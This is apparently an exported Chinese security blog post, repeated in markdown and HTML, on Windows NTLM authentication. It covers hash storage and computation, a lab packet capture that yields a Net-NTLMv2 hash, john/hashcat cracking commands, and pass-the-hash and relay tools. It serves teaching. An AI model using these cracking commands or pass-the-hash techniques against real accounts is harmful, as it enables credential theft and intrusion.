LSASS用于微软Windows系统的安全机制。它用于本地安全和登陆策略。\n\n**具体流程：**\n\n1.当我们刚开机、注销等操作后，`winlogon.exe`进程会显示一个登录界面要求我们输入用户名和密码。\n\n2.我们输入用户名和密码后，会被`winlogon.exe`获取，然后将其发送给`lsass.exe`进程。\n\n3.`lsass.exe`将明文密码计算得到`NT Hash`（不考虑LM）。\n\n4.之后会将用户名和计算得到的`NT Hash`拿到`SAM`数据库去查找比对。\n\n### 0x04 网络认证\n\n> 网络认证，顾名思义即通过网络进行认证，常见于工作组环境中，例如访问共享时进行的认证就是网络认证。网络认证使用的协议为NTLM协议。\n\n**NTLM v2认证流程：**\n\n认证流程大致可以分为三步：\n\n> - 协商：主要用于确认双方协议版本。\n> - 质询：进行挑战（Chalenge）/响应（Response）认证机制的阶段，是最重要的阶段，也是我们主要讨论的环节。\n> - 验证：质询完成后，验证结果。\n\n![](V:/hexo/myblog/source/_posts/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/QQ%E6%88%AA%E5%9B%BE20190404133112.png)\n\n质询的完整过程：\n\n客户端向服务器端发送包含用户信息(用户名)的请求。\n\n服务器接受到请求后，先使用接收到用户名到`SAM`数据库中查找看是否存在，若存在则提取对应的`NT Hash`。\n\n然后服务器会生成一个16位的随机数，称之为“Challenge”，并使用提取的`NT Hash`加密`Challenge`(16位随机字符)，得到加密结果记作`Challenge2`存储在内存中。同时，将Challenge(16位随机字符)发送给客户端。\n\n客户端接受到`Challenge`后，使用将要登录的账户对应的`NT Hash`加密(HAMC-MD5算法)`Challenge`生成`Response`(将明文密码计算为`NT Hash`是客户端计算机接收到用户输入的密码后自动做的事情)，然后将`Response`发送至服务器端。\n\n验证： 服务器端收到客户端的`Response`后，比对`Chanllenge2`与`Response`是否相等，若相等，则认证通过。\n\n**抓包分析认证过程：**\n\n实验环境介绍：\n\n> w2k8 r2建立一个文件共享，Win 10客户端访问文件共享，访问共享时需要进行登录认证，在Win 10客户机使用Wireshark进行抓包。\n\n- w2k8 r2：192.168.1.102\n- Win 10：192.168.1.101\n- 用户名：administrator\n- 密码：@superwu123\n\n抓包分析：\n\n先来看一下抓到的包总体情况,如下图。\n\n![](V:/hexo/myblog/source/_posts/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/QQ%E5%9B%BE%E7%89%8720190406111646.png)\n\n接下来我们直接看NTLM认证过程的第二个数据包，可以看到服务器返回了Challenge，记作`NTLM Server Challenge`，值为：`79f3c64adead4f15`。\n\n![](V:/hexo/myblog/source/_posts/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/QQ%E5%9B%BE%E7%89%8720190406112000.png)\n\n**Net-NTLM Hash**\n\n这里插入一段介绍Net-NTLM Hash。\n\n> Net-NTLM Hash用于Net-NTLM协议进行网络身份验证（它们来自质询/响应算法，并基于用户的`NT Hash`）。\n>\n> Net-NTLM Hash我认为并不是具体的一种Hash值，而是一种格式，从NTLM认证过程数据包中提取一些信息拼凑起来得到的格式。\n>\n> 根据协议版本的不同，Net-NTLM Hash又分为`Net-NTLMv1 Hash`和`Net-NTLMv2 Hash`。\n\n`Net-NTLMv2 Hash`格式：\n\n```\nusername::hostname:challenge:HMAC-MD5:blob\n```\n\nusername即用户名。\n\nhostname即服务器IP（或主机名）。\n\nchallenge是Server Challenge，即服务器返回的随机数。\n\nHMAC-MD5对应数据包中的`NTProofStr`字段。\n\nblob对应数据包中`NTLMv2 Response`的`NTProofStr`之后的部分。\n\n紧接着我们看下一个数据包（Response），可以先看到有一个`NTLM v2 Response`，然后`NTLMv2 Client Challenge`就是客户端加密`Server Challenge`得到的。\n\n> - NTLM v2 Response值为：\n>\n> ```\n> 09 68 4a af 9d 32 8a 4c c2 3c 30 1d 70 61 23 2d\n> 01 01 00 00 00 00 00 00 32 3b 26 fa 22 ec d4 01\n> ae d4 bf 39 51 49 f6 4e 00 00 00 00 02 00 1e 00\n> 57 00 49 00 4e 00 2d 00 55 00 52 00 41 00 55 00\n> 30 00 4c 00 4a 00 42 00 37 00 52 00 31 00 01 00\n> 1e 00 57 00 49 00 4e 00 2d 00 55 00 52 00 41 00\n> 55 00 30 00 4c 00 4a 00 42 00 37 00 52 00 31 00\n> 04 00 1e 00 57 00 49 00 4e 00 2d 00 55 00 52 00\n> 41 00 55 00 30 00 4c 00 4a 00 42 00 37 00 52 00\n> 31 00 03 00 1e 00 57 00 49 00 4e 00 2d 00 55 00\n> 52 00 41 00 55 00 30 00 4c 00 4a 00 42 00 37 00\n> 52 00 31 00 07 00 08 00 32 3b 26 fa 22 ec d4 01\n> 06 00 04 00 02 00 00 00 08 00 30 00 30 00 00 00\n> 00 00 00 00 01 00 00 00 00 20 00 00 83 61 12 00\n> 1b 95 5a d5 09 15 f1 c9 06 70 51 a1 67 f3 56 d3\n> 3e 2b ab 5f b2 63 49 b2 ca 9f 05 49 0a 00 10 00\n> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n> 09 00 24 00 63 00 69 00 66 00 73 00 2f 00 31 00\n> 39 00 32 00 2e 00 31 00 36 00 38 00 2e 00 31 00\n> 2e 00 31 00 30 00 32 00 00 00 00 00 00 00 00 00\n> 00 00 00 00\n> \n> ```\n>\n> - NTLMv2 Client Challenge值为：`aed4bf395149f64e`\n\n![](V:/hexo/myblog/source/_posts/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/QQ%E5%9B%BE%E7%89%8720190406112206.png)\n\n我们可以从数据包中提取并构建出`Net-NTLM Hash`：\n\nusername即`administrator`。\n\nhostname即`192.168.1.102`。\n\nchallenge即`79f3c64adead4f15`。（这里要注意的是是Server Challenge，而不是Client Challenge）\n\nHMAC-MD5即`09684aaf9d328a4cc23c301d7061232d`。\n\nblob即：\n\n```\n01 01 00 00 00 00 00 00 32 3b 26 fa 22 ec d4 01\nae d4 bf 39 51 49 f6 4e 00 00 00 00 02 00 1e 00\n57 00 49 00 4e 00 2d 00 55 00 52 00 41 00 55 00\n30 00 4c 00 4a 00 42 00 37 00 52 00 31 00 01 00\n1e 00 57 00 49 00 4e 00 2d 00 55 00 52 00 41 00\n55 00 30 00 4c 00 4a 00 42 00 37 00 52 00 31 00\n04 00 1e 00 57 00 49 00 4e 00 2d 00 55 00 52 00\n41 00 55 00 30 00 4c 00 4a 00 42 00 37 00 52 00\n31 00 03 00 1e 00 57 00 49 00 4e 00 2d 00 55 00\n52 00 41 00 55 00 30 00 4c 00 4a 00 42 00 37 00\n52 00 31 00 07 00 08 00 32 3b 26 fa 22 ec d4 01\n06 00 04 00 02 00 00 00 08 00 30 00 30 00 00 00\n00 00 00 00 01 00 00 00 00 20 00 00 83 61 12 00\n1b 95 5a d5 09 15 f1 c9 06 70 51 a1 67 f3 56 d3\n3e 2b ab 5f b2 63 49 b2 ca 9f 05 49 0a 00 10 00\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n09 00 24 00 63 00 69 00 66 00 73 00 2f 00 31 00\n39 00 32 00 2e 00 31 00 36 00 38 00 2e 00 31 00\n2e 00 31 00 30 00 32 00 00 00 00 00 00 00 00 00\n00 00 00 00\n\n```\n\n最终结果为：\n\n```\nadministrator::192.168.1.102:79f3c64adead4f15:09684aaf9d328a4cc23c301d7061232d:0101000000000000323b26fa22ecd401aed4bf395149f64e0000000002001e00570049004e002d00550052004100550030004c004a00420037005200310001001e00570049004e002d00550052004100550030004c004a00420037005200310004001e00570049004e002d00550052004100550030004c004a00420037005200310003001e00570049004e002d00550052004100550030004c004a00420037005200310007000800323b26fa22ecd40106000400020000000800300030000000000000000100000000200000836112001b955ad50915f1c9067051a167f356d33e2bab5fb26349b2ca9f05490a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310030003200000000000000000000000000\n```\n\n**使用中间人攻击的方式可以获取Net-NTLM hash，常用工具为Responder和Inveigh。**\n\n**NTLM v1/v2区别：**\n\n认证的流程是一样的，不同的地方在于：\n\n> - Challage长度：NTLM v1的Challenge有8位，NTLM v2的Challenge为16位。\n> - 加密Challenge的算法：NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。\n\n### 0x05 Pass The Hash\n\n观察NTLM认证的过程可以发现，整个过程中实际上并没有进行明文密码的传递，也没有使用明文密码来加密Challenge，而是用明文密码对应`NT Hash`来加密`Challenge`，那么就意味着：\n\n> 只要我们知道相应用户密码的`NT Hash`，我们就可以自己构造出`Response`发送给服务器，从而通过验证。我们并不需要知道用户的明文密码。这种攻击方式就称之为哈希传递（Pass The Hash）。\n\n常用哈希传递攻击的工具：\n\n- Smbmap\n- Smbexec\n- Metasploit psexec\n- CrackMapExec\n\n**参考资料**\n\nhttps://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4\n\nhttps://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html\n\nhttp://www.adshotgyan.com/2012/02/lm-hash-and-nt-hash.html\n\nhttps://payloads.online/archivers/2018-11-30/1?tdsourcetag=s_pcqq_aiomsg#0x00-%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81\n\nhttps://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/\n\nhttps://xz.aliyun.com/t/2205\n\nhttps://github.com/crazywa1ker/DarthSidious-Chinese/blob/master/getting-started/intro-to-windows-hashes.md\n\n","source":"_posts/01-Windows认证之NTLM.md","raw":"---\ntitle: Windows认证之NTLM\ndate: 2019-04-03 11:58:18\ntags: \n\t- NTLM\ncategories: 内网渗透\n---\n\n### 0x00 Windows密码存储\n\nWe all konw，明文存储密码是很愚蠢的行为，因为如果系统被攻破，明文密码被拿到，那么意味就全完了，但是如果是先加密再进行存储的话，即使黑客拿到加密的密码，破解也是需要费很大功夫和时间的。\n\n而现在采用的加密算法基本都是Hash摘要算法，Hash算法可以把任意长度的输入通过散列算法输出一串固定长度的值。\n\n常见的Hash算法诸如md5、SHA等，Hash算法有如下特点：\n\n> - 单向不可逆性：通过Hash值无法反向推导出输入的值。\n> - 如果两个哈希值相同，两个输入值很可能(极大概率)是相同的，但也可能不同，这种情况称为“哈希碰撞”\n\n说了那么多就是为了表明一点，Windows在存储用户密码时也不直接存储明文密码，存储的是明文密码经过Hash计算得到的Hash值，Windows存储的Hash称为`NTLM Hash`，或者`NTLM`。\n\n<!-- more -->\n\n**存储路径：**\n\n首先用户密码的Hash肯定需要存储在系统的某个文件或数据库中，Windows将用户密码计算得到的Hash存储在：\n\n> - 工作组或本地环境中，存储在一个名为`SAM`的文件内，文件路径为：`%SystemRoot%\\system32\\config\\sam`\n> - 如果是域环境，它们还存储在NTDS.dit数据库中。\n\n**存储格式：**\n\nWindows会存储用户密码对应的两种Hash，分别是`LM Hash`和`NT Hash`，它们是如何计算的，我们下节讨论。但要注意的一点是，从Windows Vista 和 Windows Server 2008开始，默认情况下只存储`NT Hash`，`LM Hash`将不再存储。\n\n格式：\n\n```\nusername : unique_identifier : LM hash : NT hash\n```\n\nusername即用户名。\n\nunique_identifier即盐（salt）。\n\nWindows将用户的密码计算为`LM Hash`和`NT Hash`，然后将它们使用冒号`:`分割存储在数据库中。\n\n### 0x01 NT Hash与LM Hash\n\n`LM Hash`是早期Windows存储的Hash格式，从Windows Vista/Server 2008开始默认是关闭的。\n\n`NT Hash`是现在Windows主要的存储的Hash。\n\n**NT Hash算法：**\n\n1.先将用户密码转换为十六进制格式。\n\n2.将十六进制格式的密码进行Unicode编码。\n\n3.使用MD4摘要算法对Unicode编码数据进行Hash计算，得到结果就是`NT Hash`。\n\n```\nadmin -> hex(16进制编码) = 61646d696e\n61646d696e -> Unicode = 610064006d0069006e00\n610064006d0069006e00 -> MD4 = 209c6174da490caeb422f3fa5a7ae634\n```\n\n破解方式：\n\n```\njohn --format=nt hash.txt\nhashcat -m 1000 -a 3 hash.txt\n```\n\n**LM Hash算法：**\n\n```\n将所有小写字母转换为大写字母\n>123ABC    // 未达到7个字符\n\n将密码转化为16进制，分两组，填充为14个字符,空余位使用0x00字符填补\n>31323341424300000000000000\n\n将密码分割为两组7个字符\n>31323341424300 00000000000000   //16进制\n\n将每组转化为比特流，不足56Bit则在左边加0\n>31323341424300 ->(转换为二进制) 110001001100100011001101000001010000100100001100000000-> (补足56Bit) 00110001001100100011001101000001010000100100001100000000\n\n将比特流按照7比特一组，分出8组，末尾加0\n由于后者都为0，结果可想而知，那就都是0;\n将每组比特流转换为16进制作为被加密的值，使用DES加密，字符串 “KGS!@#$%”为Key(0x4B47532140232425)，得到8个结果 ，每个结果转换为16进制。\n-> 00110000100110001000110001101000000101000001001000001100 00000000\n->30988C6814120C00 -> DES(30988C6814120C00) -> 48-D7-EB-91- 2F-5E-69-7C\n\n由于我们的密码不超过7字节，所以后面的一半是固定的:\nAA-D3-B4-35-B5-14-04-EE\n\n连接两个DES加密字符串。得到LM哈希。\n48-D7-EB-91-2F-5E-69-7C-AA-D3-B4-35-B5-14-04-EE\n```\n\n通过算法我们可以看到`LM Hash`脆弱点就在于DES的Key（`KGS!@#$%`）是固定的，也就是说，有了Key就能够解出原文。\n\n并且根据`LM Hash`特征，也能够判断用户的密码是否是大于等于7位。\n\n破解方式：\n\n```\njohn --format=lm hash.txt\nhashcat -m 3000 -a 3 hash.txt\n```\n\n**用Python计算Hash并与系统(win10)内存存储的Hash对比：**\n\n![](V:/hexo/myblog/source/_posts/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/QQ%E6%88%AA%E5%9B%BE20190405092904.png)\n\n### 0x02 NTLM v1/v2（AKA Net-NTLM v1/v2）\n\n> `NTLM（NT LAN Manager）`，又称为`Net-NTLM`，是一个网络认证协议，他是一种用于在Client和Server之间进行Challenge/Response验证的协议。\n\n**NTLM v1/v2与LM、NT Hash的关系：**\n\nNTLM是一个认证协议，使用LM Hash或NT Hash来进行验证。\n\n> - 在NTLM v1中，使用LM Hash和NT Hash来进行验证，如今v1已被废弃。\n> - 自从Windows 2000之后，NTLM v2是默认的认证协议。\n\nNTLM v1与NTLM v2之间的区别我们放在网络认证的章节来讨论。\n\n### 0x03 本地认证\n\n> 所谓的本地认证即在物理主机上直接进行登录的认证过程。\n\n**本地认证的大致流程：**\n\n> winlogon.exe -> 接收用户输入 -> lsass.exe -> (认证)\n\n- Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。\n- LSASS用于微软Windows系统的安全机制。它用于本地安全和登陆策略。\n\n**具体流程：**\n\n1.当我们刚开机、注销等操作后，`winlogon.exe`进程会显示一个登录界面要求我们输入用户名和密码。\n\n2.我们输入用户名和密码后，会被`winlogon.exe`获取，然后将其发送给`lsass.exe`进程。\n\n3.`lsass.exe`将明文密码计算得到`NT Hash`（不考虑LM）。\n\n4.之后会将用户名和计算得到的`NT Hash`拿到`SAM`数据库去查找比对。\n\n### 0x04 网络认证\n\n> 网络认证，顾名思义即通过网络进行认证，常见于工作组环境中，例如访问共享时进行的认证就是网络认证。网络认证使用的协议为NTLM协议。\n\n**NTLM v2认证流程：**\n\n认证流程大致可以分为三步：\n\n> - 协商：主要用于确认双方协议版本。\n> - 质询：进行挑战（Chalenge）/响应（Response）认证机制的阶段，是最重要的阶段，也是我们主要讨论的环节。\n> - 验证：质询完成后，验证结果。\n\n![](V:/hexo/myblog/source/_posts/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/QQ%E6%88%AA%E5%9B%BE20190404133112.png)\n\n质询的完整过程：\n\n客户端向服务器端发送包含用户信息(用户名)的请求。\n\n服务器接受到请求后，先使用接收到用户名到`SAM`数据库中查找看是否存在，若存在则提取对应的`NT Hash`。\n\n然后服务器会生成一个16位的随机数，称之为“Challenge”，并使用提取的`NT Hash`加密`Challenge`(16位随机字符)，得到加密结果记作`Challenge2`存储在内存中。同时，将Challenge(16位随机字符)发送给客户端。\n\n客户端接受到`Challenge`后，使用将要登录的账户对应的`NT Hash`加密(HAMC-MD5算法)`Challenge`生成`Response`(将明文密码计算为`NT Hash`是客户端计算机接收到用户输入的密码后自动做的事情)，然后将`Response`发送至服务器端。\n\n验证： 服务器端收到客户端的`Response`后，比对`Chanllenge2`与`Response`是否相等，若相等，则认证通过。\n\n**抓包分析认证过程：**\n\n实验环境介绍：\n\n> w2k8 r2建立一个文件共享，Win 10客户端访问文件共享，访问共享时需要进行登录认证，在Win 10客户机使用Wireshark进行抓包。\n\n- w2k8 r2：192.168.1.102\n- Win 10：192.168.1.101\n- 用户名：administrator\n- 密码：@superwu123\n\n抓包分析：\n\n先来看一下抓到的包总体情况,如下图。\n\n![](V:/hexo/myblog/source/_posts/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/QQ%E5%9B%BE%E7%89%8720190406111646.png)\n\n接下来我们直接看NTLM认证过程的第二个数据包，可以看到服务器返回了Challenge，记作`NTLM Server Challenge`，值为：`79f3c64adead4f15`。\n\n![](V:/hexo/myblog/source/_posts/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/QQ%E5%9B%BE%E7%89%8720190406112000.png)\n\n**Net-NTLM Hash**\n\n这里插入一段介绍Net-NTLM Hash。\n\n> Net-NTLM Hash用于Net-NTLM协议进行网络身份验证（它们来自质询/响应算法，并基于用户的`NT Hash`）。\n>\n> Net-NTLM Hash我认为并不是具体的一种Hash值，而是一种格式，从NTLM认证过程数据包中提取一些信息拼凑起来得到的格式。\n>\n> 根据协议版本的不同，Net-NTLM Hash又分为`Net-NTLMv1 Hash`和`Net-NTLMv2 Hash`。\n\n`Net-NTLMv2 Hash`格式：\n\n```\nusername::hostname:challenge:HMAC-MD5:blob\n```\n\nusername即用户名。\n\nhostname即服务器IP（或主机名）。\n\nchallenge是Server Challenge，即服务器返回的随机数。\n\nHMAC-MD5对应数据包中的`NTProofStr`字段。\n\nblob对应数据包中`NTLMv2 Response`的`NTProofStr`之后的部分。\n\n紧接着我们看下一个数据包（Response），可以先看到有一个`NTLM v2 Response`，然后`NTLMv2 Client Challenge`就是客户端加密`Server Challenge`得到的。\n\n> - NTLM v2 Response值为：\n>\n> ```\n> 09 68 4a af 9d 32 8a 4c c2 3c 30 1d 70 61 23 2d\n> 01 01 00 00 00 00 00 00 32 3b 26 fa 22 ec d4 01\n> ae d4 bf 39 51 49 f6 4e 00 00 00 00 02 00 1e 00\n> 57 00 49 00 4e 00 2d 00 55 00 52 00 41 00 55 00\n> 30 00 4c 00 4a 00 42 00 37 00 52 00 31 00 01 00\n> 1e 00 57 00 49 00 4e 00 2d 00 55 00 52 00 41 00\n> 55 00 30 00 4c 00 4a 00 42 00 37 00 52 00 31 00\n> 04 00 1e 00 57 00 49 00 4e 00 2d 00 55 00 52 00\n> 41 00 55 00 30 00 4c 00 4a 00 42 00 37 00 52 00\n> 31 00 03 00 1e 00 57 00 49 00 4e 00 2d 00 55 00\n> 52 00 41 00 55 00 30 00 4c 00 4a 00 42 00 37 00\n> 52 00 31 00 07 00 08 00 32 3b 26 fa 22 ec d4 01\n> 06 00 04 00 02 00 00 00 08 00 30 00 30 00 00 00\n> 00 00 00 00 01 00 00 00 00 20 00 00 83 61 12 00\n> 1b 95 5a d5 09 15 f1 c9 06 70 51 a1 67 f3 56 d3\n> 3e 2b ab 5f b2 63 49 b2 ca 9f 05 49 0a 00 10 00\n> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n> 09 00 24 00 63 00 69 00 66 00 73 00 2f 00 31 00\n> 39 00 32 00 2e 00 31 00 36 00 38 00 2e 00 31 00\n> 2e 00 31 00 30 00 32 00 00 00 00 00 00 00 00 00\n> 00 00 00 00\n> \n> ```\n>\n> - NTLMv2 Client Challenge值为：`aed4bf395149f64e`\n\n![](V:/hexo/myblog/source/_posts/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/QQ%E5%9B%BE%E7%89%8720190406112206.png)\n\n我们可以从数据包中提取并构建出`Net-NTLM Hash`：\n\nusername即`administrator`。\n\nhostname即`192.168.1.102`。\n\nchallenge即`79f3c64adead4f15`。（这里要注意的是是Server Challenge，而不是Client Challenge）\n\nHMAC-MD5即`09684aaf9d328a4cc23c301d7061232d`。\n\nblob即：\n\n```\n01 01 00 00 00 00 00 00 32 3b 26 fa 22 ec d4 01\nae d4 bf 39 51 49 f6 4e 00 00 00 00 02 00 1e 00\n57 00 49 00 4e 00 2d 00 55 00 52 00 41 00 55 00\n30 00 4c 00 4a 00 42 00 37 00 52 00 31 00 01 00\n1e 00 57 00 49 00 4e 00 2d 00 55 00 52 00 41 00\n55 00 30 00 4c 00 4a 00 42 00 37 00 52 00 31 00\n04 00 1e 00 57 00 49 00 4e 00 2d 00 55 00 52 00\n41 00 55 00 30 00 4c 00 4a 00 42 00 37 00 52 00\n31 00 03 00 1e 00 57 00 49 00 4e 00 2d 00 55 00\n52 00 41 00 55 00 30 00 4c 00 4a 00 42 00 37 00\n52 00 31 00 07 00 08 00 32 3b 26 fa 22 ec d4 01\n06 00 04 00 02 00 00 00 08 00 30 00 30 00 00 00\n00 00 00 00 01 00 00 00 00 20 00 00 83 61 12 00\n1b 95 5a d5 09 15 f1 c9 06 70 51 a1 67 f3 56 d3\n3e 2b ab 5f b2 63 49 b2 ca 9f 05 49 0a 00 10 00\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n09 00 24 00 63 00 69 00 66 00 73 00 2f 00 31 00\n39 00 32 00 2e 00 31 00 36 00 38 00 2e 00 31 00\n2e 00 31 00 30 00 32 00 00 00 00 00 00 00 00 00\n00 00 00 00\n\n```\n\n最终结果为：\n\n```\nadministrator::192.168.1.102:79f3c64adead4f15:09684aaf9d328a4cc23c301d7061232d:0101000000000000323b26fa22ecd401aed4bf395149f64e0000000002001e00570049004e002d00550052004100550030004c004a00420037005200310001001e00570049004e002d00550052004100550030004c004a00420037005200310004001e00570049004e002d00550052004100550030004c004a00420037005200310003001e00570049004e002d00550052004100550030004c004a00420037005200310007000800323b26fa22ecd40106000400020000000800300030000000000000000100000000200000836112001b955ad50915f1c9067051a167f356d33e2bab5fb26349b2ca9f05490a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310030003200000000000000000000000000\n```\n\n**使用中间人攻击的方式可以获取Net-NTLM hash，常用工具为Responder和Inveigh。**\n\n**NTLM v1/v2区别：**\n\n认证的流程是一样的，不同的地方在于：\n\n> - Challage长度：NTLM v1的Challenge有8位，NTLM v2的Challenge为16位。\n> - 加密Challenge的算法：NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。\n\n### 0x05 Pass The Hash\n\n观察NTLM认证的过程可以发现，整个过程中实际上并没有进行明文密码的传递，也没有使用明文密码来加密Challenge，而是用明文密码对应`NT Hash`来加密`Challenge`，那么就意味着：\n\n> 只要我们知道相应用户密码的`NT Hash`，我们就可以自己构造出`Response`发送给服务器，从而通过验证。我们并不需要知道用户的明文密码。这种攻击方式就称之为哈希传递（Pass The Hash）。\n\n常用哈希传递攻击的工具：\n\n- Smbmap\n- Smbexec\n- Metasploit psexec\n- CrackMapExec\n\n**参考资料**\n\nhttps://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4\n\nhttps://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html\n\nhttp://www.adshotgyan.com/2012/02/lm-hash-and-nt-hash.html\n\nhttps://payloads.online/archivers/2018-11-30/1?tdsourcetag=s_pcqq_aiomsg#0x00-%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81\n\nhttps://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/\n\nhttps://xz.aliyun.com/t/2205\n\nhttps://github.com/crazywa1ker/DarthSidious-Chinese/blob/master/getting-started/intro-to-windows-hashes.md\n\n","slug":"01-Windows认证之NTLM","published":1,"updated":"2019-04-08T00:37:02.689Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83mw005v7or0ypvwi1s7","content":"<h3 id=\"0x00-Windows密码存储\"><a href=\"#0x00-Windows密码存储\" class=\"headerlink\" title=\"0x00 Windows密码存储\"></a>0x00 Windows密码存储</h3><p>We all konw，明文存储密码是很愚蠢的行为，因为如果系统被攻破，明文密码被拿到，那么意味就全完了，但是如果是先加密再进行存储的话，即使黑客拿到加密的密码，破解也是需要费很大功夫和时间的。</p>\n<p>而现在采用的加密算法基本都是Hash摘要算法，Hash算法可以把任意长度的输入通过散列算法输出一串固定长度的值。</p>\n<p>常见的Hash算法诸如md5、SHA等，Hash算法有如下特点：</p>\n<blockquote>\n<ul>\n<li>单向不可逆性：通过Hash值无法反向推导出输入的值。</li>\n<li>如果两个哈希值相同，两个输入值很可能(极大概率)是相同的，但也可能不同，这种情况称为“哈希碰撞”</li>\n</ul>\n</blockquote>\n<p>说了那么多就是为了表明一点，Windows在存储用户密码时也不直接存储明文密码，存储的是明文密码经过Hash计算得到的Hash值，Windows存储的Hash称为<code>NTLM Hash</code>，或者<code>NTLM</code>。</p>\n<a id=\"more\"></a>\n<p><strong>存储路径：</strong></p>\n<p>首先用户密码的Hash肯定需要存储在系统的某个文件或数据库中，Windows将用户密码计算得到的Hash存储在：</p>\n<blockquote>\n<ul>\n<li>工作组或本地环境中，存储在一个名为<code>SAM</code>的文件内，文件路径为：<code>%SystemRoot%\\system32\\config\\sam</code></li>\n<li>如果是域环境，它们还存储在NTDS.dit数据库中。</li>\n</ul>\n</blockquote>\n<p><strong>存储格式：</strong></p>\n<p>Windows会存储用户密码对应的两种Hash，分别是<code>LM Hash</code>和<code>NT Hash</code>，它们是如何计算的，我们下节讨论。但要注意的一点是，从Windows Vista 和 Windows Server 2008开始，默认情况下只存储<code>NT Hash</code>，<code>LM Hash</code>将不再存储。</p>\n<p>格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username : unique_identifier : LM hash : NT hash</span><br></pre></td></tr></table></figure>\n<p>username即用户名。</p>\n<p>unique_identifier即盐（salt）。</p>\n<p>Windows将用户的密码计算为<code>LM Hash</code>和<code>NT Hash</code>，然后将它们使用冒号<code>:</code>分割存储在数据库中。</p>\n<h3 id=\"0x01-NT-Hash与LM-Hash\"><a href=\"#0x01-NT-Hash与LM-Hash\" class=\"headerlink\" title=\"0x01 NT Hash与LM Hash\"></a>0x01 NT Hash与LM Hash</h3><p><code>LM Hash</code>是早期Windows存储的Hash格式，从Windows Vista/Server 2008开始默认是关闭的。</p>\n<p><code>NT Hash</code>是现在Windows主要的存储的Hash。</p>\n<p><strong>NT Hash算法：</strong></p>\n<p>1.先将用户密码转换为十六进制格式。</p>\n<p>2.将十六进制格式的密码进行Unicode编码。</p>\n<p>3.使用MD4摘要算法对Unicode编码数据进行Hash计算，得到结果就是<code>NT Hash</code>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin -&gt; hex(16进制编码) = 61646d696e</span><br><span class=\"line\">61646d696e -&gt; Unicode = 610064006d0069006e00</span><br><span class=\"line\">610064006d0069006e00 -&gt; MD4 = 209c6174da490caeb422f3fa5a7ae634</span><br></pre></td></tr></table></figure>\n<p>破解方式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">john --format=nt hash.txt</span><br><span class=\"line\">hashcat -m 1000 -a 3 hash.txt</span><br></pre></td></tr></table></figure>\n<p><strong>LM Hash算法：</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">将所有小写字母转换为大写字母</span><br><span class=\"line\">&gt;123ABC    // 未达到7个字符</span><br><span class=\"line\"></span><br><span class=\"line\">将密码转化为16进制，分两组，填充为14个字符,空余位使用0x00字符填补</span><br><span class=\"line\">&gt;31323341424300000000000000</span><br><span class=\"line\"></span><br><span class=\"line\">将密码分割为两组7个字符</span><br><span class=\"line\">&gt;31323341424300 00000000000000   //16进制</span><br><span class=\"line\"></span><br><span class=\"line\">将每组转化为比特流，不足56Bit则在左边加0</span><br><span class=\"line\">&gt;31323341424300 -&gt;(转换为二进制) 110001001100100011001101000001010000100100001100000000-&gt; (补足56Bit) 00110001001100100011001101000001010000100100001100000000</span><br><span class=\"line\"></span><br><span class=\"line\">将比特流按照7比特一组，分出8组，末尾加0</span><br><span class=\"line\">由于后者都为0，结果可想而知，那就都是0;</span><br><span class=\"line\">将每组比特流转换为16进制作为被加密的值，使用DES加密，字符串 